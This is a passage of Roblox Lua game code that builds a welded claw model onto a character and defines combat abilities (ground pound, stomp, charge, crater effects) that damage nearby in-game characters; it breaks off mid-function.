p18.CFrame = CFrame.new(-0.0516102314, 6.25535488, -20.1996384, 0.066943109, -0.245838761, -0.967011333, 0.965954781, 0.258709013, 0.00110003352, 0.249906152, -0.934162259, 0.254788101)
p18.CanCollide = false
p18.Locked = true
b16 = Instance.new("SpecialMesh", p18)
b16.MeshId = "http://www.roblox.com/Asset/?id=9756362"
b16.TextureId = ""
b16.MeshType = Enum.MeshType.FileMesh
b16.Name = "Mesh"
b16.Scale = Vector3.new(1.20000005, 0.449999988, 0.449999988)
p19 = Instance.new("Part", m)
p19.BrickColor = BrickColor.new("New Yeller")
p19.FormFactor = Enum.FormFactor.Symmetric
p19.Size = Vector3.new(1, 1, 1)
p19.CFrame = CFrame.new(2.43177533, 3.59484506, -20.0301056, 0.559401393, 0.116905749, 0.820629179, -0.685213447, -0.491872638, 0.537163019, 0.466440916, -0.862796843, -0.195047855)
p19.CanCollide = false
p19.Locked = true
b17 = Instance.new("SpecialMesh", p19)
b17.MeshId = "http://www.roblox.com/Asset/?id=9756362"
b17.TextureId = ""
b17.MeshType = Enum.MeshType.FileMesh
b17.Name = "Mesh"
b17.Scale = Vector3.new(1.20000005, 0.449999988, 0.449999988)
p20 = Instance.new("Part", m)
p20.BrickColor = BrickColor.new("Institutional white")
p20.FormFactor = Enum.FormFactor.Custom
p20.Size = Vector3.new(3, 1, 2.4000001)
p20.CFrame = CFrame.new(1.49873698, 4.13275099, -16.500618, -2.38418579e-007, -4.47034836e-007, -1.00001454, -0.000133797526, 1.00000024, -2.98023224e-008, 1.00001466, 0.000135831535, -5.96046448e-008)
p20.CanCollide = false
p20.Locked = true
p20.BottomSurface = Enum.SurfaceType.Smooth
p20.TopSurface = Enum.SurfaceType.Smooth
b18 = Instance.new("BlockMesh", p20)
b18.Name = "Mesh"
p21 = Instance.new("Part", m)
p21.BrickColor = BrickColor.new("Institutional white")
p21.FormFactor = Enum.FormFactor.Custom
p21.Size = Vector3.new(3, 1, 1.19999993)
p21.CFrame = CFrame.new(0.398718834, 5.13273239, -16.5005798, -2.22529991e-007, -4.17224015e-007, -1.00001454, -0.000133820766, 1.00000024, 5.9472427e-012, 1.00001466, 0.000135854774, -4.37120207e-008)
p21.CanCollide = false
p21.Locked = true
p21.BottomSurface = Enum.SurfaceType.Smooth
p21.TopSurface = Enum.SurfaceType.Smooth
b19 = Instance.new("BlockMesh", p21)
b19.Name = "Mesh"
p22 = Instance.new("WedgePart", m)
p22.BrickColor = BrickColor.new("Institutional white")
p22.Name = "Wedge"
p22.FormFactor = Enum.FormFactor.Custom
p22.Size = Vector3.new(3, 1, 0.5)
p22.CFrame = CFrame.new(2.94884443, 4.13282013, -16.5005474, 1.35156796e-007, 4.17202415e-007, -1.00001454, 1.19470278e-005, -1.00000024, -6.07483681e-013, -1.00001466, -1.39792755e-005, 4.37120278e-008)
p22.CanCollide = false
p22.Locked = true
p22.BottomSurface = Enum.SurfaceType.Smooth
p22.TopSurface = Enum.SurfaceType.Smooth
p23 = Instance.new("Part", m)
p23.BrickColor = BrickColor.new("Institutional white")
p23.FormFactor = Enum.FormFactor.Custom
p23.Size = Vector3.new(1.5, 0.5, 0.5)
p23.CFrame = CFrame.new(0.111123323, 6.79699326, -19.53405, 0.167916089, 0.220654398, 0.960804224, 0.593452632, -0.800862908, 0.0802069977, 0.787171543, 0.556722164, -0.265425682)
p23.CanCollide = false
p23.Locked = true
p23.BottomSurface = Enum.SurfaceType.Smooth
p23.TopSurface = Enum.SurfaceType.Smooth
b20 = Instance.new("BlockMesh", p23)
b20.Name = "Mesh"
p24 = Instance.new("WedgePart", m)
p24.BrickColor = BrickColor.new("Institutional white")
p24.Name = "Wedge"
p24.FormFactor = Enum.FormFactor.Custom
p24.Size = Vector3.new(3, 1, 0.5)
p24.CFrame = CFrame.new(0.0487362742, 6.13243389, -16.5004158, -0.000165194273, -0.00030361861, 1.00001442, 0.00304524973, 0.999995589, 0.000303655863, -1.00001013, 0.00304720178, -0.000164449215)
p24.CanCollide = false
p24.Locked = true
p24.BottomSurface = Enum.SurfaceType.Smooth
p24.TopSurface = Enum.SurfaceType.Smooth
p25 = Instance.new("Part", m)
p25.BrickColor = BrickColor.new("New Yeller")
p25.FormFactor = Enum.FormFactor.Symmetric
p25.Size = Vector3.new(1, 1, 1)
p25.CFrame = CFrame.new(1.49870086, 5.13261318, -18.0007782, 1.20991026e-005, -1.00001454, -4.94604174e-005, -1.00000024, -1.16155716e-005, -0.000471511274, 0.000469659513, 4.96469293e-005, -1.00001466)
p25.CanCollide = false
p25.Locked = true
p25.BottomSurface = Enum.SurfaceType.Smooth
p25.TopSurface = Enum.SurfaceType.Smooth
b21 = Instance.new("SpecialMesh", p25)
b21.MeshId = "http://www.roblox.com/asset/?id=3270017"
b21.TextureId = ""
b21.MeshType = Enum.MeshType.FileMesh
b21.Name = "Mesh"
b21.Scale = Vector3.new(1.39999998, 1.39999998, 0.600000024)
p26 = Instance.new("Part", m)
p26.BrickColor = BrickColor.new("Institutional white")
p26.FormFactor = Enum.FormFactor.Symmetric
p26.Size = Vector3.new(1, 1, 1)
p26.CFrame = CFrame.new(1.49868095, 5.13287783, -17.5005093, 0.00030383491, 0.000164763711, -1.00001454, -0.999995768, -0.00302907336, -0.000303868263, -0.00303102471, 1.00001025, 0.000164022902)
p26.CanCollide = false
p26.Locked = true
p26.BottomSurface = Enum.SurfaceType.Smooth
p26.TopSurface = Enum.SurfaceType.Smooth
b22 = Instance.new("SpecialMesh", p26)
b22.MeshType = Enum.MeshType.Brick
b22.Name = "Mesh"
w1 = Instance.new("Weld", p1)
w1.Name = "Wedge_Weld"
w1.Part0 = p1
w1.C0 = CFrame.new(13.1579618, 15.8875484, 3.27191186, -0.205515206, 0.52527827, 0.825741529, -0.209888965, -0.847774804, 0.487057745, 0.955883741, -0.0732159689, 0.284480691)
w1.Part1 = p2
w1.C1 = CFrame.new(16.5005817, -6.13223743, 2.94872212, -4.37113883e-008, -1.38580826e-005, 1, 0, 1, 1.38580826e-005, -1, 6.05756005e-013, -4.37113883e-008)
w2 = Instance.new("Weld", p2)
w2.Name = "Part_Weld"
w2.Part0 = p2
w2.C0 = CFrame.new(16.5006275, -6.13223362, 2.94873357, -5.96046448e-008, -1.3615936e-005, 1.00000358, -4.47034836e-008, 0.99999994, 1.41002238e-005, -1.00000358, 4.47034836e-008, 0)
w2.Part1 = p3
w2.C1 = CFrame.new(19.4568748, -3.38260746, -1.84870064, -4.37113883e-008, -0.499906301, 0.866079509, 0, -0.866079509, -0.499906301, 1, -2.18515979e-008, 3.78575393e-008)
w3 = Instance.new("Weld", p3)
w3.Name = "Wedge_Weld"
w3.Part0 = p3
w3.C0 = CFrame.new(19.456995, -3.38268948, -1.84870648, -5.06400113e-008, -0.499905825, 0.86608547, 1.07230136e-007, -0.866079628, -0.499910295, 1.00000715, -1.1125789e-007, -2.17476881e-008)
w3.Part1 = p4
w3.C1 = CFrame.new(16.5005646, 4.13256884, -0.0487511083, -4.37113883e-008, -1.37408551e-005, 1, 0, -1, -1.37408551e-005, 1, -6.00631849e-013, 4.37113883e-008)
w4 = Instance.new("Weld", p4)
w4.Name = "Part_Weld"
w4.Part0 = p4
w4.C0 = CFrame.new(16.5007706, 4.13255453, -0.0487275235, -1.62921424e-007, -1.2755394e-005, 1.00001431, 1.78814929e-007, -0.999999762, -1.46627426e-005, 1.00001431, -1.78813849e-007, -7.54998553e-008)
w4.Part1 = p5
w4.C1 = CFrame.new(13.6104183, 15.7089605, -1.84869325, -4.37113883e-008, 0.500093758, 0.865971267, 0, -0.865971267, 0.500093758, 1, 2.18597922e-008, 3.78528071e-008)
w5 = Instance.new("Weld", p5)
w5.Name = "Part_Weld"
w5.Part0 = p5
w5.C0 = CFrame.new(13.6108379, 15.7090359, -1.84877098, -4.29027068e-007, 0.500089467, 0.865987122, 1.9046513e-007, -0.865973532, 0.50009501, 1.00001431, 2.18601315e-008, 3.78533827e-008)
w5.Part1 = p6
w5.C1 = CFrame.new(19.3720245, -3.33087778, 2.54137325, -0.249996737, -0.491388977, 0.834289134, 0.0669635162, -0.868360817, -0.491391122, 0.965928316, -0.0669792444, 0.24999252)
w6 = Instance.new("Weld", p6)
w6.Name = "Part_Weld"
w6.Part0 = p6
w6.C0 = CFrame.new(19.3722382, -3.33087826, 2.54137945, -0.250001401, -0.491382152, 0.834303975, 0.0669622123, -0.868364573, -0.491393685, 0.965941966, -0.0669801831, 0.249996051)
w6.Part1 = p7
w6.C1 = CFrame.new(16.5012703, -5.1305232, 2.59873891, -4.37113883e-008, -0.000135861075, 1, 0, 1, 0.000135861075, -1, 5.9386762e-012, -4.37113883e-008)
w7 = Instance.new("Weld", p7)
w7.Name = "Part_Weld"
w7.Part0 = p7
w7.C0 = CFrame.new(16.5014496, -5.13052464, 2.59877563, -3.27825546e-007, -0.000133868307, 1.00001442, -3.57627869e-007, 0.99999994, 0.000135900453, -1.00001431, 1.49011612e-008, -5.96046448e-008)
w7.Part1 = p8
w7.C1 = CFrame.new(-0.765930653, -21.3311157, 1.75706458, -1.37833995e-005, 0.965968609, 0.258659452, 0.00428466033, 0.258657128, -0.965959728, -0.999990821, 0.00109495374, -0.00414241292)
w8 = Instance.new("Weld", p8)
w8.Name = "Part_Weld"
w8.Part0 = p8
w8.C0 = CFrame.new(-0.765703201, -21.3314991, 1.75706851, -1.42129729e-005, 0.965967655, 0.258668512, 0.00428489037, 0.258660465, -0.965972245, -1.00000513, 0.00109496934, -0.00414247159)
w8.Part1 = p9
w8.C1 = CFrame.new(11.6857395, -12.2548676, 8.25926208, -0.277089596, 0.631037474, 0.724577785, -0.561487973, 0.505604029, -0.655054033, -0.779713154, -0.588350415, 0.214222342)
w9 = Instance.new("Weld", p9)
w9.Name = "Part_Weld"
w9.Part0 = p9
w9.C0 = CFrame.new(11.6860123, -12.254859, 8.25934601, -0.277095288, 0.631033003, 0.724593103, -0.561500967, 0.505603611, -0.655058563, -0.779720128, -0.58835566, 0.214224264)
w9.Part1 = p10
w9.C1 = CFrame.new(-0.759226322, -21.3225994, -2.35311079, -0.0669693872, 0.965954244, 0.249894977, 0.254174918, 0.258710593, -0.931914091, -0.964836895, 0.00110732042, -0.262847036)
w10 = Instance.new("Weld", p10)
w10.Name = "Part_Weld"
w10.Part0 = p10
w10.C0 = CFrame.new(-0.759016514, -21.3229256, -2.3531487, -0.0669716895, 0.96595335, 0.249903828, 0.254178405, 0.258713901, -0.93192625, -0.964850724, 0.00110733509, -0.262850702)
w10.Part1 = p11
w10.C1 = CFrame.new(18.7059784, -3.17931223, -5.46201515, 0.250018269, -0.49138394, 0.834285676, -0.0669495314, -0.86836195, -0.491391063, 0.965923727, 0.0670017004, -0.250004292)
w11 = Instance.new("Weld", p11)
w11.Name = "Part_Weld"
w11.Part0 = p11
w11.C0 = CFrame.new(18.7061806, -3.17931461, -5.46200418, 0.250022948, -0.491377324, 0.834300399, -0.0669473261, -0.868365645, -0.491393894, 0.965937555, 0.0670026764, -0.250007868)
w11.Part1 = p12
w11.C1 = CFrame.new(13.6104174, 15.708952, -1.1486963, -4.37113883e-008, 0.500093997, 0.865971148, 0, -0.865971148, 0.500093997, 1, 2.18598029e-008, 3.78528e-008)
w12 = Instance.new("Weld", p12)
w12.Name = "Part_Weld"
w12.Part0 = p12
w12.C0 = CFrame.new(13.6107903, 15.7090092, -1.1487354, -4.76837158e-007, 0.500089884, 0.865987122, 2.83122063e-007, -0.865973473, 0.500095367, 1.00001442, 4.47034836e-008, 1.49011612e-008)
w12.Part1 = p13
w12.C1 = CFrame.new(19.4568653, -3.38261366, -1.14870369, -4.37113883e-008, -0.499906093, 0.866079628, 0, -0.866079628, -0.499906093, 1, -2.1851589e-008, 3.78575429e-008)
w13 = Instance.new("Weld", p13)
w13.Name = "Part_Weld"
w13.Part0 = p13
w13.C0 = CFrame.new(19.457077, -3.38260937, -1.14871991, -4.63888163e-008, -0.499899268, 0.866095126, 5.08347114e-007, -0.866083562, -0.499908328, 1.00001442, -2.18518963e-008, 3.78581007e-008)
w13.Part1 = p14
w13.C1 = CFrame.new(-0.765169621, -21.3281136, 1.05768669, -1.37638153e-005, 0.96595937, 0.258693874, 0.00425664661, 0.258691579, -0.965950608, -0.99999094, 0.00108787336, -0.00411530817)
w14 = Instance.new("Weld", p14)
w14.Name = "ArmPart_Weld"
w14.Part0 = p14
w14.C0 = CFrame.new(-0.764959335, -21.3284416, 1.05770254, -1.42545232e-005, 0.965958476, 0.258703023, 0.00425684778, 0.258694947, -0.965963125, -1.00000536, 0.00108788908, -0.00411536777)
w14.Part1 = p15
w14.C1 = CFrame.new(16.0000172, 5.13429213, -1.49874043, -4.37113883e-008, 0.000108154614, 1, 0, -1, 0.000108154614, 1, 4.72758855e-012, 4.37113883e-008)
w15 = Instance.new("Weld", p15)
w15.Name = "Part_Weld"
w15.Part0 = p15
w15.C0 = CFrame.new(16.0001163, 5.13430214, -1.49877143, -2.99420208e-007, 0.00011029192, 1.00001454, 4.39002179e-007, -1, 0.000108176115, 1.00001442, 0, 4.42378223e-008)
w15.Part1 = p16
w15.C1 = CFrame.new(16.5000153, 6.13429213, -1.49872518, -4.37113883e-008, 0.000108154614, 1, 0, -1, 0.000108154614, 1, 4.72758855e-012, 4.37113883e-008)
w16 = Instance.new("Weld", p16)
w16.Name = "Part_Weld"
w16.Part0 = p16
w16.C0 = CFrame.new(16.5002594, 6.1342907, -1.49874651, -2.98894406e-007, 0.000110270419, 1.00001454, 4.39006953e-007, -1, 0.000108154614, 1.00001442, 4.71678729e-012, 4.37120207e-008)
w16.Part1 = p17
w16.C1 = CFrame.new(16.8263168, 6.46704865, 8.05857849, 0.396029502, -0.207962677, 0.894378066, -0.497426808, 0.770130157, 0.399332225, -0.771833658, -0.603034973, 0.201548025)
w17 = Instance.new("Weld", p17)
w17.Name = "Part_Weld"
w17.Part0 = p17
w17.C0 = CFrame.new(16.8266068, 6.46726036, 8.05869198, 0.396035522, -0.207958207, 0.894391596, -0.497440547, 0.770127177, 0.399337679, -0.771840453, -0.603040278, 0.201549783)
w17.Part1 = p18
w17.C1 = CFrame.new(-0.991122723, -20.5004215, 5.08983374, 0.0669417754, 0.965955615, 0.249897182, -0.245835528, 0.258705586, -0.9341501, -0.966997266, 0.00110005983, 0.254784435)
w18 = Instance.new("Weld", p18)
w18.Name = "Part_Weld"
w18.Part0 = p18
w18.C0 = CFrame.new(-0.990923882, -20.5007305, 5.08983374, 0.066943109, 0.965954781, 0.249906152, -0.245838761, 0.258709013, -0.934162259, -0.967011333, 0.00110003352, 0.254788101)
w18.Part1 = p19
w18.C1 = CFrame.new(10.4456682, -15.7977238, -7.8332901, 0.559388936, -0.68521893, 0.466432214, 0.116898462, -0.491870552, -0.862785101, 0.820620954, 0.537157655, -0.195045918)
w19 = Instance.new("Weld", p19)
w19.Name = "Part_Weld"
w19.Part0 = p19
w19.C0 = CFrame.new(10.4457512, -15.7979813, -7.83342838, 0.559401393, -0.685213447, 0.466440916, 0.116905749, -0.491872638, -0.862796843, 0.820629179, 0.537163019, -0.195047855)
w19.Part1 = p20
w19.C1 = CFrame.new(16.5012665, -4.13050127, 1.49876332, -4.37113883e-008, -0.000135854745, 1, 0, 1, 0.000135854745, -1, 5.93839951e-012, -4.37113883e-008)
w20 = Instance.new("Weld", p20)
w20.Name = "Part_Weld"
w20.Part0 = p20
w20.C0 = CFrame.new(16.5013981, -4.13050938, 1.498757, -2.38418579e-007, -0.000133797526, 1.00001466, -4.47034836e-007, 1.00000024, 0.000135831535, -1.00001454, -2.98023224e-008, -5.96046448e-008)
w20.Part1 = p21
w20.C1 = CFrame.new(16.5012627, -5.13048887, 0.39874959, -4.37113883e-008, -0.000135854745, 1, 0, 1, 0.000135854745, -1, 5.93839951e-012, -4.37113883e-008)
w21 = Instance.new("Weld", p21)
w21.Name = "Wedge_Weld"
w21.Part0 = p21
w21.C0 = CFrame.new(16.5014935, -5.13049126, 0.398722976, -2.22529991e-007, -0.000133820766, 1.00001466, -4.17224015e-007, 1.00000024, 0.000135854774, -1.00001454, 5.9472427e-012, -4.37120207e-008)
w21.Part1 = p22
w21.C1 = CFrame.new(-16.5005875, 4.13259029, 2.94876933, -4.37113883e-008, 1.39792737e-005, -1, 0, -1, -1.39792737e-005, -1, -6.11053471e-013, 4.37113883e-008)
w22 = Instance.new("Weld", p22)
w22.Name = "Part_Weld"
w22.Part0 = p22
w22.C0 = CFrame.new(-16.500824, 4.13258791, 2.94888711, 1.35156796e-007, 1.19470278e-005, -1.00001466, 4.17202415e-007, -1.00000024, -1.39792755e-005, -1.00001454, -6.07483681e-013, 4.37120278e-008)
w22.Part1 = p23
w22.C1 = CFrame.new(11.3238592, 16.2938461, -5.83674097, 0.167913347, 0.593457043, 0.787155509, 0.220650926, -0.800859332, 0.556720257, 0.960790455, 0.0802058354, -0.265421808)
w23 = Instance.new("Weld", p23)
w23.Name = "Wedge_Weld"
w23.Part0 = p23
w23.C0 = CFrame.new(11.3242846, 16.2939701, -5.83676767, 0.167916089, 0.593452632, 0.787171543, 0.220654398, -0.800862908, 0.556722164, 0.960804224, 0.0802069977, -0.265425682)
w23.Part1 = p24
w23.C1 = CFrame.new(-16.5190907, -6.08210278, -0.053311754, -0.000165350299, 0.00304719806, -0.999995351, -0.000303142268, 0.999995351, 0.00304725766, 0.99999994, 0.000303644716, -0.000164425801)
w24 = Instance.new("Weld", p24)
w24.Name = "Part_Weld"
w24.Part0 = p24
w24.C0 = CFrame.new(-16.5192356, -6.08211088, -0.0533116534, -0.000165194273, 0.00304524973, -1.00001013, -0.00030361861, 0.999995589, 0.00304720178, 1.00001442, 0.000303655863, -0.000164449215)
w24.Part1 = p25
w24.C1 = CFrame.new(5.14108515, 1.49960721, -17.9982204, 1.16387992e-005, -0.999999881, 0.000471503939, -1, -1.1615477e-005, 4.94651576e-005, -4.94596788e-005, -0.000471504522, -0.999999881)
w25 = Instance.new("Weld", p25)
w25.Name = "Part_Weld"
w25.Part0 = p25
w25.C0 = CFrame.new(5.14104986, 1.49967504, -17.9985313, 1.20991026e-005, -1.00000024, 0.000469659513, -1.00001454, -1.16155716e-005, 4.96469293e-005, -4.94604174e-005, -0.000471511274, -1.00001466)
w25.Part1 = p26
w25.C1 = CFrame.new(5.07938719, 17.5157299, 1.50311017, 0.00030336561, -0.99999541, -0.00302907825, 0.000164940167, -0.00302901864, 0.999995351, -0.99999994, -0.000303863839, 0.000164020501)
m.Parent = char
m:MakeJoints()
----------------------------------------------------
local cor2 = Instance.new("Part", char.Claw)
cor2.Name = "Thingy"
cor2.Locked = true
cor2.BottomSurface = 0
cor2.CanCollide = false
cor2.Size = Vector3.new(2, 1, 1)
cor2.Transparency = 1
cor2.TopSurface = 0
corw2 = Instance.new("Weld", cor2)
corw2.Part0 = larm
corw2.Part1 = cor2
corw2.C0 = CFrame.new(0, -1, 0) * CFrame.Angles(math.rad(0), math.rad(180), math.rad(90))
corw2.C1 = CFrame.new(0, 0, 0)
weld2 = Instance.new("Weld", char.Claw)
weld2.Part0 = cor2
weld2.Part1 = char.Claw.ArmPart
weld2.C0 = CFrame.new(0, 0, 0)
----------------------------------------------------
function weld5(part0, part1, c0, c1)
    weeld=Instance.new("Weld", part0)
    weeld.Part0=part0
    weeld.Part1=part1
    weeld.C0=c0
    weeld.C1=c1
    return weeld
end
----------------------------------------------------
function newRay(start,face,range,wat)
	local rey=Ray.new(start.p,(face.p-start.p).Unit*range)
	hit,pos=Workspace:FindPartOnRayWithIgnoreList(rey,wat)
	return rey,hit,pos
end
----------------------------------------------------
mod5 = Instance.new("Model",char)

function FindNearestTorso(Position,Distance,SinglePlayer)
    if SinglePlayer then return(SinglePlayer.Torso.CFrame.p -Position).magnitude < Distance end
        local List = {}
        for i,v in pairs(workspace:GetChildren())do
            if v:IsA("Model")then
                if v:findFirstChild("Torso")then
                    if v ~= char then
                        if(v.Torso.Position -Position).magnitude <= Distance then
                            table.insert(List,v)
                        end 
                    end 
                end 
            end 
        end
    return List
end

function Landing()
    part=Instance.new('Part',mod5)
    part.Anchored=true
    part.CanCollide=false
    part.FormFactor='Custom'
    part.Size=Vector3.new(.2,.2,.2)
    part.CFrame=root.CFrame*CFrame.new(0,-2,0)
    part.Transparency=.7
    part.BrickColor=BrickColor.new('Institutional white')
    mesh=Instance.new('SpecialMesh',part)
    mesh.MeshId='http://www.roblox.com/asset/?id=20329976'
    mesh.Scale=Vector3.new(10,5,10)

    for i,v in pairs(FindNearestTorso(torso.CFrame.p,40))do
        if v:FindFirstChild('Humanoid') then
            v.Humanoid:TakeDamage(math.random(20,30))
            v.Humanoid.PlatformStand = true
            v:FindFirstChild("Torso").Velocity = hed.CFrame.lookVector * 100
        end
    end

    coroutine.resume(coroutine.create(function() 
        for i=0,3.8,0.05 do
            wait()
            part.CFrame=part.CFrame
            part.Transparency=i
            mesh.Scale=mesh.Scale+Vector3.new(1,0.2,1)
            end
        part.Parent = nil
    end))
end
----------------------------------------------------
mod4 = Instance.new("Model",char)

ptez = {0.7, 0.8, 0.9, 1}

function FindNearestTorso(Position,Distance,SinglePlayer)
    if SinglePlayer then return(SinglePlayer.Torso.CFrame.p -Position).magnitude < Distance end
        local List = {}
        for i,v in pairs(workspace:GetChildren())do
            if v:IsA("Model")then
                if v:findFirstChild("Torso")then
                    if v ~= char then
                        if(v.Torso.Position -Position).magnitude <= Distance then
                            table.insert(List,v)
                        end 
                    end 
                end 
            end 
        end
    return List
end

function GroundPound()
    part=Instance.new('Part',mod4)
    part.Anchored=true
    part.CanCollide=false
    part.FormFactor='Custom'
    part.Size=Vector3.new(.2,.2,.2)
    part.CFrame=root.CFrame*CFrame.new(0,-5.8,-2.4)*CFrame.Angles(math.rad(90),0,0)
    part.Transparency=.7
    part.BrickColor=BrickColor.new('Institutional white')
    mesh=Instance.new('SpecialMesh',part)
    mesh.MeshId='http://www.roblox.com/asset/?id=3270017'
    mesh.Scale=Vector3.new(3,3,3)
    part2=Instance.new('Part',mod4)
    part2.Anchored=true
    part2.CanCollide=false
    part2.FormFactor='Custom'
    part2.Size=Vector3.new(.2,.2,.2)
    part2.CFrame=root.CFrame*CFrame.new(0,-5,-2.6)
    part2.Transparency=.7
    part2.BrickColor=BrickColor.new('Really red')
    mesh2=Instance.new('SpecialMesh',part2)
    mesh2.MeshId='http://www.roblox.com/asset/?id=20329976'
    mesh2.Scale=Vector3.new(3,1.5,3)
    x = Instance.new("Sound",char)
    x.SoundId = "http://www.roblox.com/asset/?id=142070127"
    x.Pitch = ptez[math.random(1,#ptez)]
    x.Volume = 1
    wait(.1)
    x:Play()
    for i,v in pairs(FindNearestTorso(torso.CFrame.p,12))do
        if v:FindFirstChild('Humanoid') then
            v.Humanoid:TakeDamage(math.random(8,15))
        end
    end
    coroutine.resume(coroutine.create(function() 
        for i=0,0.62,0.13 do
            wait()
            part.CFrame=part.CFrame
            part.Transparency=i
            mesh.Scale=mesh.Scale+Vector3.new(0.4,0.4,0.4)
            part2.CFrame=part2.CFrame
            part2.Transparency=i
            mesh2.Scale=mesh2.Scale+Vector3.new(0.4,0.2,0.4)
            end
        part.Parent=nil
        part2.Parent=nil
        x:Destroy()
    end))
end
----------------------------------------------------
mod=Instance.new('Model',char)

function charge()
    hed.Velocity=hed.CFrame.lookVector*200
    part=Instance.new('Part',mod)
    part.Anchored=true
    part.CanCollide=false
    part.FormFactor='Custom'
    part.Size=Vector3.new(.2,.2,.2)
    part.CFrame=hed.CFrame*CFrame.Angles(math.rad(90),0,0)
    part.Transparency=.7
    part.BrickColor=BrickColor.new('New Yeller')
    mesh=Instance.new('SpecialMesh',part)
    mesh.MeshId='http://www.roblox.com/asset/?id=20329976'
    mesh.Scale=Vector3.new(10,5,10)
    part2=part:clone()
    part2.Parent=mod
    part2.BrickColor=BrickColor.new('Bright red')
    mesh2=mesh:clone()
    mesh2.Parent=part2
    mesh2.Scale=Vector3.new(20,10,20)
    part3=part2:clone()
    part3.Parent = mod
    part3.BrickColor=BrickColor.new('Institutional white')
    mesh3=mesh2:clone()
    mesh2.Parent=part3
    mesh3.Scale=Vector3.new(30,15,30)
    coroutine.resume(coroutine.create(function() 
        for i=0,1,0.1 do
            wait()
            part.CFrame=part.CFrame
            part.Transparency=i
            mesh.Scale=mesh.Scale+Vector3.new(1,1,1)
            part2.CFrame=part2.CFrame
            part2.Transparency=i
            mesh2.Scale=mesh2.Scale+Vector3.new(1,1,1)
            part3.CFrame=part3.CFrame
            part3.Transparency=i
            mesh3.Scale=mesh3.Scale+Vector3.new(1,1,1)
            end
        part.Parent=nil
        part2.Parent=nil
        part3.Parent = nil
    end))
end
----------------------------------------------------
function FindNearestTorso(Position,Distance,SinglePlayer)
    if SinglePlayer then return(SinglePlayer.Torso.CFrame.p -Position).magnitude < Distance end
        local List = {}
        for i,v in pairs(workspace:GetChildren())do
            if v:IsA("Model")then
                if v:findFirstChild("Torso")then
                    if v ~= char then
                        if(v.Torso.Position -Position).magnitude <= Distance then
                            table.insert(List,v)
                        end 
                    end 
                end 
            end 
        end
    return List
end

mod3 = Instance.new("Model",rleg)

function Stomp()
    part=Instance.new('Part',mod3)
    part.Anchored=true
    part.CanCollide=false
    part.FormFactor='Custom'
    part.Size=Vector3.new(.2,.2,.2)
    part.CFrame=rleg.CFrame*CFrame.new(0,-2.4,0)*CFrame.Angles(math.rad(90),0,0)
    part.Transparency=.7
    part.BrickColor=BrickColor.new('Bright green')
    mesh=Instance.new('SpecialMesh',part)
    mesh.MeshId='http://www.roblox.com/asset/?id=3270017'
    mesh.Scale=Vector3.new(25,25,25)
    part2=part:clone()
    part2.Parent=mod3
    part2.BrickColor=BrickColor.new('Bright green')
    mesh2=mesh:clone()
    mesh2.Parent=part2
    mesh2.Scale=Vector3.new(15,15,15)
    part3=part:clone()
    part3.Parent=mod3
    part3.TopSurface=0
    part3.BottomSurface=0
    part3.CFrame=rleg.CFrame*CFrame.new(0,-3,0)
    mesh3=Instance.new('SpecialMesh',part3)
    mesh3.MeshType = 3
    mesh3.Scale=Vector3.new(12,12,12)
    for i,v in pairs(FindNearestTorso(torso.CFrame.p,50))do
        if v:FindFirstChild('Humanoid') then
            v.Humanoid:TakeDamage(math.random(20,60))
            v.Humanoid.PlatformStand = true
            v:FindFirstChild("Torso").Velocity = hed.CFrame.lookVector * 100
        end
    end 
    coroutine.resume(coroutine.create(function() 
        for i=0,3.8,0.05 do
            wait()
            part.CFrame=part.CFrame
            part.Transparency=i
            mesh.Scale=mesh.Scale+Vector3.new(2.8,2.8,2.8)
            part2.CFrame=part2.CFrame
            part2.Transparency=i
            mesh2.Scale=mesh2.Scale+Vector3.new(1,1,1)
            part3.CFrame=part3.CFrame
            part3.Transparency=i
            mesh3.Scale=mesh3.Scale+Vector3.new(1.5,1.5,1.5)
        end
    end))
end
----------------------------------------------------

local acos = math.acos
local sqrt = math.sqrt
local Vec3 = Vector3.new
local fromAxisAngle = CFrame.fromAxisAngle

local function toAxisAngle(CFr)
        local X,Y,Z,R00,R01,R02,R10,R11,R12,R20,R21,R22 = CFr:components()
        local Angle = math.acos((R00+R11+R22-1)/2)
        local A = (R21-R12)^2+(R02-R20)^2+(R10-R01)^2
        A = A == 0 and 0.00001 or A
        local B = (R21-R12)^2+(R02-R20)^2+(R10-R01)^2
        B = B == 0 and 0.00001 or B
        local C = (R21-R12)^2+(R02-R20)^2+(R10-R01)^2
        C = C == 0 and 0.00001 or C
        local x = (R21-R12)/sqrt(A)
        local y = (R02-R20)/sqrt(B)
        local z = (R10-R01)/sqrt(C)
        return Vec3(x,y,z),Angle
end

function ApplyTrig(Num,Func)
        local Min,Max = Func(0),Func(1)
        local i = Func(Num)
        return (i-Min)/(Max-Min)
        --[[if Func == "sin" then
                return (math.sin((1-Num)*math.pi)+1)/2
        elseif Func == "cos" then
                return (math.cos((1-Num)*math.pi)+1)/2
        end]]
end

function LerpCFrame(CFrame1,CFrame2,Num)
        local Vec,Ang = toAxisAngle(CFrame1:inverse()*CFrame2)
        return CFrame1*fromAxisAngle(Vec,Ang*Num) + (CFrame2.p-CFrame1.p)*Num
end

function Crater(Torso,Radius)
        Spawn(function()
        local Ray = Ray.new(Torso.Position,Vector3.new(0,-1,0)*10)
        local Ignore = {}
        for i,v in pairs(game:GetService("Players"):GetPlayers()) do
                if v.Character ~= nil then
                        Ignore[#Ignore+1] = v.Character
                end
        end
        local Hit,Pos,SurfaceNorm = Workspace:FindPartOnRayWithIgnoreList(Ray,Ignore)
        if Hit == nil then return end
        local Parts = {}
        for i = 1,360,10 do
                local P = Instance.new("Part",Torso.Parent)
                P.Anchored = true
                P.FormFactor = "Custom"
                P.BrickColor = Hit.BrickColor
                P.Material = Hit.Material
                P.TopSurface = "Smooth"
                P.BottomSurface = "Smooth"
                P.Size = Vector3.new(5,10,10)*(math.random(80,100)/100)
                P.CFrame = ((CFrame.new(Pos,Pos+SurfaceNorm)*CFrame.Angles(math.rad(90),0,0))-Vector3.new(0,7,0))*CFrame.Angles(math.rad(math.random(-50,50)),math.rad(math.random(-50,50)),math.rad(math.random(-50,50)))
                Parts[#Parts+1] = {P,P.CFrame,((CFrame.new(Pos,Pos+SurfaceNorm)*CFrame.Angles(math.rad(90),0,0))-Vector3.new(0,1,0))*CFrame.Angles(0,math.rad(i),0)*CFrame.new(0,0,-Radius)*CFrame.Angles(math.rad(math.random(-50,-20)),math.rad(math.random(-15,15)),math.rad(math.random(-15,15))),P.Size}
                if math.random(0,5) == 0 then -- rubble
                        local P = Instance.new("Part",Torso.Parent)
                        P.Anchored = true
                        P.FormFactor = "Custom"
                        P.BrickColor = Hit.BrickColor
                        P.Material = Hit.Material
                        P.TopSurface = "Smooth"
                        P.BottomSurface = "Smooth"
